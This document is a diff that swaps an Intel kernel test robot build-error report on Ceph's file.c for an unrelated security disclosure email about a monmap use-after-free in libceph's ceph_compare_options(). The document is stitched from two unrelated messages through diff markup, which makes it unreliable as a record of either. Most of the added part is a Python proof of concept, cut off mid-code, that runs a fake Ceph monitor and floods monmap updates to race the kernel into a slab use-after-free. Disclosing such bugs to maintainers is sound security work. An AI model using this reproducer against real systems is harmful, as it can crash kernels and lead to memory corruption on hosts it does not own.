@@ -1,292 +1,669 @@
-Received: from mgamail.intel.com (mgamail.intel.com [198.175.65.11])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4801435DA6F
-	for <ceph-devel@vger.kernel.org>; Wed,  8 Jul 2026 01:13:01 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=198.175.65.11
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A435426ADC
+	for <ceph-devel@vger.kernel.org>; Wed,  8 Jul 2026 03:03:53 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1783473183; cv=none; b=gh5UL1W0T6dnXykXmcd0Xhysx3dp+7VI6XqngPY2P63p5No4zHwdxwMhCtvy3oSCM1XWyh5K8fD10Po5WbgN+u6LUDftZq/EJj1iBCVZ1QyaKyMcfLCE+xuQ7xMvJYTaNqgy/zPfd+usvi4ltxOabxTor2svpSfVMq9C1gffVz4=
+	t=1783479835; cv=none; b=eU4MhAHSyd7T8ECmOGIR81RJnzcoyDTw7kK7nlx6Og+dTEx2v+f8JvPV6cNeqQjurFI/7M7ZZEtnEVxOdD1lSOFG10P8zCGiAX1n/bXWAeEoGm+Q2yPo1dZ8Nn5b6Bsp22mUa0STB5hLQiXmZD07My1M5/HV2D13pJn7SgkMFGY=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1783473183; c=relaxed/simple;
-	bh=gQKDg+PjMVfdZ8belB0MhPPvUeOvJ0purvdKquIBMn0=;
-	h=Date:From:To:Cc:Subject:Message-ID; b=DN3VOakOf+U3f0albmDG6zMdxptoMIEgCetEyRGis8v3Hlo56iuop+GORV2H2hoEGZNSQ4i2U5EcS2Le4gGfki4w0yXfS+/Nr1e3undvl9pcE3uOZR+H6KfYMh4hH9qAE67YZN7BCmiFRuJ3dZfJi5V7MnSDPgrFF7D4ZyeBxfw=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com; spf=pass smtp.mailfrom=intel.com; dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b=exyRPI8J; arc=none smtp.client-ip=198.175.65.11
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=intel.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=intel.com
+	s=arc-20240116; t=1783479835; c=relaxed/simple;
+	bh=tg/9ayt8dNQHHx0QzLlCeb+BIluJKHoo0CWJ8hYB13A=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GQBVR92DjZL1mQciUJMKuzZKRhJHEClVfZ3rLDnQpKX91tDUPhWJbEXxwb00IPqOZAv8wtflVQVB9VUiqRMCX0EgGt43kSdROb3W3Fg2emFEztnoMmyeZEqPAUvct4LqHBjuOnCUdsD3FRpn99RMahxngOYbsZ/U8LayR5gDfnk=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eq6+jGj1; arc=none smtp.client-ip=209.85.210.182
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=intel.com header.i=@intel.com header.b="exyRPI8J"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
-  d=intel.com; i=@intel.com; q=dns/txt; s=Intel;
-  t=1783473182; x=1815009182;
-  h=date:from:to:cc:subject:message-id;
-  bh=gQKDg+PjMVfdZ8belB0MhPPvUeOvJ0purvdKquIBMn0=;
-  b=exyRPI8JsPVH9ypcsegbXJkO1Up/XyrQepsB3JvHcBtAdXB/tNYDC8FZ
-   tfN5/12Hka9AEucZ/QWC+uvbzKRRCha4L8ANQzLnye9uIFcdvni1a9sRO
-   zdxVxA41nOjkElitmwKTWLyrW3/IKXLf6AvoIk1dZVcl8zfqrD6+lgvYz
-   I98iYceRl0MkKNN/6KqbPbh1hUR68d/QChps3hpvHXsylNeqCwphJ/36W
-   4TIAwRmtO8c9DP2ZnNZHO9eiLES8zwJUHGpKUEEPJfHMgSMfWiIT8U1aX
-   +ytYANzIWcjLrIpXOCS2tAh3sdzPJpBZjjwp3vxCCQotVFmQN4xzBp+w4
-   A==;
-X-CSE-ConnectionGUID: 98+CtbcKRx63vXf8hCGk5A==
-X-CSE-MsgGUID: Y3G+hj1GTv+k95pZz7bzwQ==
-X-IronPort-AV: E=McAfee;i="6800,10657,11840"; a="94484099"
-X-IronPort-AV: E=Sophos;i="6.25,153,1779174000"; 
-   d="scan'208";a="94484099"
-Received: from orviesa008.jf.intel.com ([10.64.159.148])
-  by orvoesa103.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 07 Jul 2026 18:13:01 -0700
-X-CSE-ConnectionGUID: H/RDLTB9Sz6HbBYyE7tV1Q==
-X-CSE-MsgGUID: 8EzM34agTZ20FT1rRkq/Fw==
-X-ExtLoop1: 1
-X-IronPort-AV: E=Sophos;i="6.25,153,1779174000"; 
-   d="scan'208";a="253648628"
-Received: from igk-lkp-server01.igk.intel.com (HELO e5a8ed462067) ([10.211.93.152])
-  by orviesa008.jf.intel.com with ESMTP; 07 Jul 2026 18:12:59 -0700
-Received: from kbuild by e5a8ed462067 with local (Exim 4.98.2)
-	(envelope-from <lkp@intel.com>)
-	id 1whGqO-000000002eX-2PNQ;
-	Wed, 08 Jul 2026 01:12:56 +0000
-Date: Wed, 08 Jul 2026 03:12:53 +0200
-From: kernel test robot <lkp@intel.com>
-To: Max Kellermann <max.kellermann@ionos.com>
-Cc: llvm@lists.linux.dev, oe-kbuild-all@lists.linux.dev,
- ceph-devel@vger.kernel.org, Alex Markuze <amarkuze@redhat.com>
-Subject: [ceph-client:testing 25/27] fs/ceph/file.c:2573:7: error:
- use of undeclared identifier 'CEPH_MOUNT_OPT_NEARFULL_SYNC'
-Message-ID: <202607080354.apa5Nv1u-lkp@intel.com>
-User-Agent: s-nail v14.9.25
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eq6+jGj1"
+Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-84794e800f4so114960b3a.0
+        for <ceph-devel@vger.kernel.org>; Tue, 07 Jul 2026 20:03:53 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1783479833; x=1784084633; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
+        b=eq6+jGj1TUURbhlgNfvq1Az3TGikdXH1G5ntJ37+tKpSkLqgRPfwYuO7OLWWG+ixdi
+         IEND7XuwZtxd29pA910zK5Li+Ro8icr6v6mkDtrLU304ShVw2fsZ7OLUX9m4Is2aCnzG
+         Lmpcwe1X8KUmceBaqi/JWeYDazuM09lbSfailHZn2XlouLzvwQhoC1fzY2MHGel4HRA9
+         ndTEcKI2T+nHiutXdAqsRELZgIOHYZEmDL9+fQrMMIyWTv+rbk8q7vTZN15A1jfMclyq
+         6xccAC5a/1gItEBnW0JLLWuYVO0iy3burkL5MYqRd7NHKCjx5yyOALpXHIoU0pl0Yeay
+         fleA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1783479833; x=1784084633;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
+        b=k0VbRDaRIFOI/1pBmFPRtq02HNN9e+xGlBoZLaGerIhAgvJYpSkR9/0rGrewXc9hov
+         AJ+L4CTel51gyzU8W1VgojWfHeqyF8hD7ggpbAv/eHamj3vOiw8DdmJktDa//ryxWQbO
+         KwPONblIg5ZUo53u7VcZfxP1zbd+2xcsLgA70QoFwdYnnMhgfnMaNgGsmby6N8WujOHm
+         NUDPCcAyINONHI24Vgn6JooEw3nT8W7BhLjQlLFERYpe3ewNFCIdOl1QCQBbrxQGQk+H
+         KDLdeEaTHVZIpKhxKrCXtpinIEBMuaAKO0Uy64vy+2uZWM+CdovyVwpFrbYFvCCLnI0w
+         kKPg==
+X-Gm-Message-State: AOJu0YzMOck5AAp/PYuAtGi99gjdbcrZtoqTRqb3XG7ALJqaxjMr6tZs
+	4LojXCn/5u4FyBWESdFxiUeNLyln22X3AxmmNu9W6IE3XnKe/T0eZZGWEpT1MViQ
+X-Gm-Gg: AfdE7cm2UN/LPClTnRKL9BZdwugBvA2fDsbojNgGmt158hGyuvi4vyA0+f1iZjjge6R
+	clF/nmekMAQskOH6TaU9kcLQcYTu4AUtToaDzKSpVvj9ltIPK53FTvk8wMX+Gquwe9/uxGgPUNe
+	n/U3SaKdcCRjETliae/jg9+azc4DlNKhXvBvyy/uG4TJnXK/d4E8mIQZM777SdzVPL8FPS1oXwV
+	79SCIfEU4P/DJroorvOhqD27HkfkruIdp5DFytpo/GsmLYMTEuO7zyQaQvsq8kP90L0mdX9wJV4
+	PUo2FOFsAS3wU3IaZkFFcbeh41rlc2lvHzLweQIyNmUvDBl4noGqM2bmn/J0Wix2r+ONOLubJvm
+	3PHGbq7qAiXGWNn51sIMAwOBxKfcBEZwXtLUfCzkt1l+cOqPmq5sQ0igNuon6X/ERzFTHnhjjFr
+	R8dYlfMMOnW29uRJA7sswmtPoYpeWn2zo=
+X-Received: by 2002:a05:6a00:4c88:b0:848:2f74:d8d4 with SMTP id d2e1a72fcca58-8484300062emr721184b3a.69.1783479832873;
+        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([123.114.53.210])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-847f6b609acsm6175745b3a.1.2026.07.07.20.03.50
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: ceph-devel@vger.kernel.org
+Cc: yuantan098@gmail.com,
+	dstsmallbird@foxmail.com,
+	edragain@163.com,
+	enjou1224z@gmail.com
+Subject: [PATCH 0/1] libceph: fix a monmap use-after-free in ceph_compare_options()
+Date: Wed,  8 Jul 2026 11:03:40 +0800
+Message-ID: <cover.1783423648.git.edragain@163.com>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: ceph-devel@vger.kernel.org
 List-Id: <ceph-devel.vger.kernel.org>
 List-Subscribe: <mailto:ceph-devel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:ceph-devel+unsubscribe@vger.kernel.org>
+MIME-Version: 1.0
+Content-Transfer-Encoding: 8bit
 
-tree:   https://github.com/ceph/ceph-client.git testing
-head:   fc67edb66b3c9924c4e0bb366a92b32ea13c526a
-commit: cb4ac0e6565fe667dba2760b6a012306e6f796e0 [25/27] ceph: fix hanging __ceph_get_caps() with stale `mds_wanted`
-config: x86_64-rhel-9.4-rust (https://download.01.org/0day-ci/archive/20260708/202607080354.apa5Nv1u-lkp@intel.com/config)
-compiler: clang version 22.1.8 (https://github.com/llvm/llvm-project ca7933e47d3a3451d81e72ac174dcb5aa28b59d1)
-reproduce (this is a W=1 build): (https://download.01.org/0day-ci/archive/20260708/202607080354.apa5Nv1u-lkp@intel.com/reproduce)
+From: Yong Wang <edragain@163.com>
 
-If you fix the issue in a separate patch/commit (i.e. not just a new version of
-the same patch/commit), kindly add following tags
-| Reported-by: kernel test robot <lkp@intel.com>
-| Closes: https://lore.kernel.org/oe-kbuild-all/202607080354.apa5Nv1u-lkp@intel.com/
+Hi Linux kernel maintainers,
 
-All errors (new ones prefixed by >>):
+We found and validated a use-after-free in net/ceph/ceph_common.c.
+The bug is reachable by root via the normal CephFS mount path.
+We tested the fix and it does not change the existing non-blocking
+mount-share comparison semantics.
 
->> fs/ceph/file.c:2573:7: error: use of undeclared identifier 'CEPH_MOUNT_OPT_NEARFULL_SYNC'
-    2573 |                 if (ceph_test_mount_opt(fsc, NEARFULL_SYNC) &&
-         |                     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   fs/ceph/super.h:60:36: note: expanded from macro 'ceph_test_mount_opt'
-      60 |         (!!((fsc)->mount_options->flags & CEPH_MOUNT_OPT_##opt))
-         |                                           ^~~~~~~~~~~~~~~~~~~~
-   <scratch space>:27:1: note: expanded from here
-      27 | CEPH_MOUNT_OPT_NEARFULL_SYNC
-         | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~
-   1 error generated.
+We provide the technical details, the reproducer that triggers the bug
+and the crash log below.
+
+---- details below ----
+
+Bug details:
+
+ceph_compare_options() determines whether a new mount can share an
+existing client by checking whether any monitor address in the new
+mount options is present in client->monc.monmap:
+
+	for (i = 0; i < opt1->num_mon; i++) {
+		if (ceph_monmap_contains(client->monc.monmap,
+					 &opt1->mon_addr[i]))
+			return 0;
+	}
+
+That path runs from ceph_compare_super() during shared mount lookup.
+It can execute under sb_lock or rbd_client_list_lock, so it cannot
+take monc->mutex.
+
+Monitor map updates, however, replace monc->monmap under monc->mutex
+and free the old map immediately:
+
+	mutex_lock(&monc->mutex);
+	...
+	kfree(monc->monmap);
+	monc->monmap = monmap;
+
+ceph_monmap_contains() then walks m->num_mon and m->mon_inst[] on a
+monmap object whose lifetime is not protected against concurrent
+replacement.  A shared-mount comparison racing a monmap update can
+therefore dereference a freed struct ceph_monmap and walk stale
+mon_inst[] entries, leading to a slab-use-after-free.
+
+The attached patch fixes this by protecting the compare path with RCU
+and by publishing/freeing monitor maps with rcu_assign_pointer() and
+kfree_rcu().
+
+Reproducer:
+
+We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+exec python3 "poc.py" \
+  --ssh-port "$QEMU_SSH_PORT" \
+  --monitor-port "6789" \
+  --workers "16" \
+  --duration "5" \
+  --attempts "10" \
+  --update-interval "0.0005"
+
+------BEGIN poc.py------
+#!/usr/bin/env python3
+import argparse
+import os
+import shlex
+import socket
+import struct
+import subprocess
+import sys
+import threading
+import time
+
+POLY = 0x82F63B78
+BANNER = b"ceph v027"
+BANNER_ADDR = b"\x00" * 136
+FSID = bytes.fromhex("11223344556677889900aabbccddeeff")
+
+TAG_READY = 1
+TAG_MSG = 7
+TAG_ACK = 8
+TAG_KEEPALIVE = 9
+TAG_KEEPALIVE2 = 14
+TAG_KEEPALIVE2_ACK = 15
+TAG_CLOSE = 6
+
+MSG_MON_MAP = 4
+MSG_MON_SUBSCRIBE = 15
+MSG_MON_SUBSCRIBE_ACK = 16
+MSG_AUTH = 17
+MSG_AUTH_REPLY = 18
+
+NUM_MON = 31
 
 
-vim +/CEPH_MOUNT_OPT_NEARFULL_SYNC +2573 fs/ceph/file.c
+def crc32c(data, seed=0):
+    crc = seed & 0xFFFFFFFF
+    for b in data:
+        crc ^= b
+        for _ in range(8):
+            if crc & 1:
+                crc = (crc >> 1) ^ POLY
+            else:
+                crc >>= 1
+            crc &= 0xFFFFFFFF
+    return crc
 
-  2395	
-  2396	/*
-  2397	 * Take cap references to avoid releasing caps to MDS mid-write.
-  2398	 *
-  2399	 * If we are synchronous, and write with an old snap context, the OSD
-  2400	 * may return EOLDSNAPC.  In that case, retry the write.. _after_
-  2401	 * dropping our cap refs and allowing the pending snap to logically
-  2402	 * complete _before_ this write occurs.
-  2403	 *
-  2404	 * If requested, nearfull writes are synced to preserve the legacy
-  2405	 * client-side backpressure behavior.
-  2406	 */
-  2407	static ssize_t ceph_write_iter(struct kiocb *iocb, struct iov_iter *from)
-  2408	{
-  2409		struct file *file = iocb->ki_filp;
-  2410		struct ceph_file_info *fi = file->private_data;
-  2411		struct inode *inode = file_inode(file);
-  2412		struct ceph_inode_info *ci = ceph_inode(inode);
-  2413		struct ceph_fs_client *fsc = ceph_inode_to_fs_client(inode);
-  2414		struct ceph_client *cl = fsc->client;
-  2415		struct ceph_osd_client *osdc = &fsc->client->osdc;
-  2416		struct ceph_cap_flush *prealloc_cf;
-  2417		ssize_t count, written = 0;
-  2418		int err, want = 0, got;
-  2419		bool direct_lock = false;
-  2420		u32 map_flags;
-  2421		u64 pool_flags;
-  2422		loff_t pos;
-  2423		loff_t limit = max(i_size_read(inode), fsc->max_file_size);
-  2424	
-  2425		if (ceph_inode_is_shutdown(inode))
-  2426			return -ESTALE;
-  2427	
-  2428		if (ceph_snap(inode) != CEPH_NOSNAP)
-  2429			return -EROFS;
-  2430	
-  2431		prealloc_cf = ceph_alloc_cap_flush();
-  2432		if (!prealloc_cf)
-  2433			return -ENOMEM;
-  2434	
-  2435		if ((iocb->ki_flags & (IOCB_DIRECT | IOCB_APPEND)) == IOCB_DIRECT)
-  2436			direct_lock = true;
-  2437	
-  2438	retry_snap:
-  2439		err = direct_lock ? ceph_start_io_direct(inode) :
-  2440				    ceph_start_io_write(inode);
-  2441		if (err)
-  2442			goto out_unlocked;
-  2443	
-  2444		if (iocb->ki_flags & IOCB_APPEND) {
-  2445			err = ceph_do_getattr(inode, CEPH_STAT_CAP_SIZE, false);
-  2446			if (err < 0)
-  2447				goto out;
-  2448		}
-  2449	
-  2450		err = generic_write_checks(iocb, from);
-  2451		if (err <= 0)
-  2452			goto out;
-  2453	
-  2454		pos = iocb->ki_pos;
-  2455		if (unlikely(pos >= limit)) {
-  2456			err = -EFBIG;
-  2457			goto out;
-  2458		} else {
-  2459			iov_iter_truncate(from, limit - pos);
-  2460		}
-  2461	
-  2462		count = iov_iter_count(from);
-  2463		if (ceph_quota_is_max_bytes_exceeded(inode, pos + count)) {
-  2464			err = -EDQUOT;
-  2465			goto out;
-  2466		}
-  2467	
-  2468		down_read(&osdc->lock);
-  2469		map_flags = osdc->osdmap->flags;
-  2470		pool_flags = ceph_pg_pool_flags(osdc->osdmap, ci->i_layout.pool_id);
-  2471		up_read(&osdc->lock);
-  2472		if ((map_flags & CEPH_OSDMAP_FULL) ||
-  2473		    (pool_flags & CEPH_POOL_FLAG_FULL)) {
-  2474			err = -ENOSPC;
-  2475			goto out;
-  2476		}
-  2477	
-  2478		err = file_remove_privs(file);
-  2479		if (err)
-  2480			goto out;
-  2481	
-  2482		doutc(cl, "%p %llx.%llx %llu~%zd getting caps. i_size %llu\n",
-  2483		      inode, ceph_vinop(inode), pos, count,
-  2484		      i_size_read(inode));
-  2485		if (!(fi->flags & CEPH_F_SYNC) && !direct_lock)
-  2486			want |= CEPH_CAP_FILE_BUFFER;
-  2487		if (fi->fmode & CEPH_FILE_MODE_LAZY)
-  2488			want |= CEPH_CAP_FILE_LAZYIO;
-  2489		got = 0;
-  2490		err = ceph_get_caps(file, CEPH_CAP_FILE_WR, want, pos + count, &got);
-  2491		if (err < 0)
-  2492			goto out;
-  2493	
-  2494		err = file_update_time(file);
-  2495		if (err)
-  2496			goto out_caps;
-  2497	
-  2498		inode_inc_iversion_raw(inode);
-  2499	
-  2500		doutc(cl, "%p %llx.%llx %llu~%zd got cap refs on %s\n",
-  2501		      inode, ceph_vinop(inode), pos, count, ceph_cap_string(got));
-  2502	
-  2503		if ((got & (CEPH_CAP_FILE_BUFFER|CEPH_CAP_FILE_LAZYIO)) == 0 ||
-  2504		    (iocb->ki_flags & IOCB_DIRECT) || (fi->flags & CEPH_F_SYNC) ||
-  2505		    test_bit(CEPH_I_ERROR_WRITE_BIT, &ci->i_ceph_flags)) {
-  2506			struct ceph_snap_context *snapc;
-  2507			struct iov_iter data;
-  2508	
-  2509			spin_lock(&ci->i_ceph_lock);
-  2510			if (__ceph_have_pending_cap_snap(ci)) {
-  2511				struct ceph_cap_snap *capsnap =
-  2512						list_last_entry(&ci->i_cap_snaps,
-  2513								struct ceph_cap_snap,
-  2514								ci_item);
-  2515				snapc = ceph_get_snap_context(capsnap->context);
-  2516			} else {
-  2517				BUG_ON(!ci->i_head_snapc);
-  2518				snapc = ceph_get_snap_context(ci->i_head_snapc);
-  2519			}
-  2520			spin_unlock(&ci->i_ceph_lock);
-  2521	
-  2522			/* we might need to revert back to that point */
-  2523			data = *from;
-  2524			if ((iocb->ki_flags & IOCB_DIRECT) && !IS_ENCRYPTED(inode))
-  2525				written = ceph_direct_read_write(iocb, &data, snapc,
-  2526								 &prealloc_cf);
-  2527			else
-  2528				written = ceph_sync_write(iocb, &data, pos, snapc);
-  2529			if (direct_lock)
-  2530				ceph_end_io_direct(inode);
-  2531			else
-  2532				ceph_end_io_write(inode);
-  2533			if (written > 0)
-  2534				iov_iter_advance(from, written);
-  2535			ceph_put_snap_context(snapc);
-  2536		} else {
-  2537			/*
-  2538			 * No need to acquire the i_truncate_mutex. Because
-  2539			 * the MDS revokes Fwb caps before sending truncate
-  2540			 * message to us. We can't get Fwb cap while there
-  2541			 * are pending vmtruncate. So write and vmtruncate
-  2542			 * can not run at the same time
-  2543			 */
-  2544			written = generic_perform_write(iocb, from);
-  2545			ceph_end_io_write(inode);
-  2546		}
-  2547	
-  2548		if (written >= 0) {
-  2549			int dirty;
-  2550	
-  2551			spin_lock(&ci->i_ceph_lock);
-  2552			dirty = __ceph_mark_dirty_caps(ci, CEPH_CAP_FILE_WR,
-  2553						       &prealloc_cf);
-  2554			spin_unlock(&ci->i_ceph_lock);
-  2555			if (dirty)
-  2556				__mark_inode_dirty(inode, dirty);
-  2557			if (ceph_quota_is_max_bytes_approaching(inode, iocb->ki_pos))
-  2558				ceph_check_caps(ci, CHECK_CAPS_FLUSH);
-  2559		}
-  2560	
-  2561		doutc(cl, "%p %llx.%llx %llu~%u  dropping cap refs on %s\n",
-  2562		      inode, ceph_vinop(inode), pos, (unsigned)count,
-  2563		      ceph_cap_string(got));
-  2564		ceph_put_cap_refs(ci, got);
-  2565	
-  2566		if (written == -EOLDSNAPC) {
-  2567			doutc(cl, "%p %llx.%llx %llu~%u" "got EOLDSNAPC, retrying\n",
-  2568			      inode, ceph_vinop(inode), pos, (unsigned)count);
-  2569			goto retry_snap;
-  2570		}
-  2571	
-  2572		if (written >= 0) {
-> 2573			if (ceph_test_mount_opt(fsc, NEARFULL_SYNC) &&
-  2574			    ((map_flags & CEPH_OSDMAP_NEARFULL) ||
-  2575			     (pool_flags & CEPH_POOL_FLAG_NEARFULL)))
-  2576				iocb->ki_flags |= IOCB_DSYNC;
-  2577			written = generic_write_sync(iocb, written);
-  2578		}
-  2579	
-  2580		goto out_unlocked;
-  2581	out_caps:
-  2582		ceph_put_cap_refs(ci, got);
-  2583	out:
-  2584		if (direct_lock)
-  2585			ceph_end_io_direct(inode);
-  2586		else
-  2587			ceph_end_io_write(inode);
-  2588	out_unlocked:
-  2589		ceph_free_cap_flush(prealloc_cf);
-  2590		return written ? written : err;
-  2591	}
-  2592	
 
---
-0-DAY CI Kernel Test Service
-https://github.com/intel/lkp-tests/wiki
+def recv_exact(sock, length):
+    data = b""
+    while len(data) < length:
+        chunk = sock.recv(length - len(data))
+        if not chunk:
+            raise EOFError("peer closed")
+        data += chunk
+    return data
+
+
+def pack_header(seq, tid, msg_type, front_len):
+    hdr = b""
+    hdr += struct.pack("<Q", seq)
+    hdr += struct.pack("<Q", tid)
+    hdr += struct.pack("<H", msg_type)
+    hdr += struct.pack("<H", 127)
+    hdr += struct.pack("<H", 0)
+    hdr += struct.pack("<I", front_len)
+    hdr += struct.pack("<I", 0)
+    hdr += struct.pack("<I", 0)
+    hdr += struct.pack("<H", 0)
+    hdr += struct.pack("<B", 1)
+    hdr += struct.pack("<Q", 0)
+    hdr += struct.pack("<H", 0)
+    hdr += struct.pack("<H", 0)
+    hdr += struct.pack("<I", crc32c(hdr))
+    return hdr
+
+
+def pack_msg(seq, tid, msg_type, front):
+    hdr = pack_header(seq, tid, msg_type, len(front))
+    footer = struct.pack("<IIIQb", crc32c(front), 0, 0, 0, 1)
+    return bytes([TAG_MSG]) + hdr + front + footer
+
+
+def parse_msg_header(hdr):
+    return {
+        "seq": struct.unpack_from("<Q", hdr, 0)[0],
+        "tid": struct.unpack_from("<Q", hdr, 8)[0],
+        "type": struct.unpack_from("<H", hdr, 16)[0],
+        "front_len": struct.unpack_from("<I", hdr, 22)[0],
+        "middle_len": struct.unpack_from("<I", hdr, 26)[0],
+        "data_len": struct.unpack_from("<I", hdr, 30)[0],
+    }
+
+
+def enc_addr(ip, port):
+    ip_bytes = socket.inet_aton(ip)
+    sockaddr = struct.pack("<H", socket.AF_INET)
+    sockaddr += struct.pack(">H", port)
+    sockaddr += ip_bytes
+    sockaddr += b"\x00" * 8
+
+    addr_struct = b""
+    addr_struct += struct.pack("<B", 1)
+    addr_struct += struct.pack("<BBI", 1, 1, 12 + len(sockaddr))
+    addr_struct += struct.pack("<I", 1)
+    addr_struct += struct.pack("<I", 0)
+    addr_struct += struct.pack("<I", len(sockaddr))
+    addr_struct += sockaddr
+    return addr_struct
+
+
+def enc_monmap(epoch):
+    body = FSID
+    body += struct.pack("<I", epoch)
+    body += struct.pack("<I", NUM_MON)
+
+    for i in range(NUM_MON):
+        name = f"m{i}".encode()
+        body += struct.pack("<I", len(name))
+        body += name
+        body += enc_addr("10.0.2.123", 7000 + i)
+
+    blob = struct.pack("<BBI", 5, 5, len(body)) + body
+    return struct.pack("<I", len(blob)) + blob
+
+
+class ConnWorker(threading.Thread):
+    def __init__(self, conn, stop_event, update_interval):
+        super().__init__(daemon=True)
+        self.conn = conn
+        self.stop_event = stop_event
+        self.update_interval = update_interval
+        self.seq = 0
+        self.epoch = 0
+        self.subscribed = False
+        self.error = ""
+
+    def send_msg(self, tid, msg_type, front):
+        self.seq += 1
+        self.conn.sendall(pack_msg(self.seq, tid, msg_type, front))
+
+    def handle_handshake(self):
+        _ = recv_exact(self.conn, 9 + 136)
+        self.conn.sendall(BANNER + BANNER_ADDR + BANNER_ADDR)
+
+        cmsg = recv_exact(self.conn, 33)
+        features, _host_type, gseq, cseq, proto, _aproto, alen, _flags = struct.unpack(
+            "<QIIIIIIb", cmsg
+        )
+        if alen:
+            _ = recv_exact(self.conn, alen)
+
+        reply = struct.pack("<BQIIIIb", TAG_READY, features, gseq, cseq + 1, proto, 0, 0)
+        self.conn.sendall(reply)
+        self.conn.settimeout(0.001)
+
+    def handle_msg(self, hdr_info, front):
+        if hdr_info["type"] == MSG_AUTH:
+            auth_reply = struct.pack("<IIQI", 1, 0, 0x1234, 0) + struct.pack("<I", 0)
+            self.send_msg(hdr_info["tid"], MSG_AUTH_REPLY, auth_reply)
+            return
+
+        if hdr_info["type"] == MSG_MON_SUBSCRIBE:
+            self.subscribed = True
+            self.send_msg(hdr_info["tid"], MSG_MON_SUBSCRIBE_ACK, struct.pack("<I", 30) + FSID)
+            return
+
+    def run(self):
+        try:
+            self.handle_handshake()
+            next_update = time.time()
+
+            while not self.stop_event.is_set():
+                now = time.time()
+                if self.subscribed and now >= next_update:
+                    sent = 0
+                    while now >= next_update and sent < 4:
+                        self.epoch += 1
+                        self.send_msg(0, MSG_MON_MAP, enc_monmap(self.epoch))
+                        next_update += self.update_interval
+                        sent += 1
+                        now = time.time()
+
+                try:
+                    tag = self.conn.recv(1)
+                except socket.timeout:
+                    continue
+
+                if not tag:
+                    return
+
+                tag = tag[0]
+                if tag == TAG_KEEPALIVE2:
+                    stamp = recv_exact(self.conn, 8)
+                    self.conn.sendall(bytes([TAG_KEEPALIVE2_ACK]) + stamp)
+                    continue
+                if tag == TAG_KEEPALIVE:
+                    continue
+                if tag == TAG_ACK:
+                    _ = recv_exact(self.conn, 8)
+                    continue
+                if tag == TAG_CLOSE:
+                    return
+                if tag != TAG_MSG:
+                    continue
+
+                hdr = recv_exact(self.conn, 53)
+                hdr_info = parse_msg_header(hdr)
+                front = recv_exact(self.conn, hdr_info["front_len"])
+                if hdr_info["middle_len"]:
+                    _ = recv_exact(self.conn, hdr_info["middle_len"])
+                if hdr_info["data_len"]:
+                    _ = recv_exact(self.conn, hdr_info["data_len"])
+                _ = recv_exact(self.conn, 21)
+                self.handle_msg(hdr_info, front)
+        except Exception as exc:
+            self.error = str(exc)
+        finally:
+            try:
+                self.conn.close()
+            except OSError:
+                pass
+
+
+class FakeMonitor:
+    def __init__(self, port, update_interval):
+        self.port = port
+        self.update_interval = update_interval
+        self.stop_event = threading.Event()
+        self.server = None
+        self.accept_thread = None
+        self.workers = []
+        self.accept_errors = []
+
+    def start(self):
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self.server.bind(("0.0.0.0", self.port))
+        self.server.listen(256)
+        self.server.settimeout(0.2)
+
+        self.accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
+        self.accept_thread.start()
+
+    def accept_loop(self):
+        while not self.stop_event.is_set():
+            try:
+                conn, _addr = self.server.accept()
+            except socket.timeout:
+                continue
+            except OSError as exc:
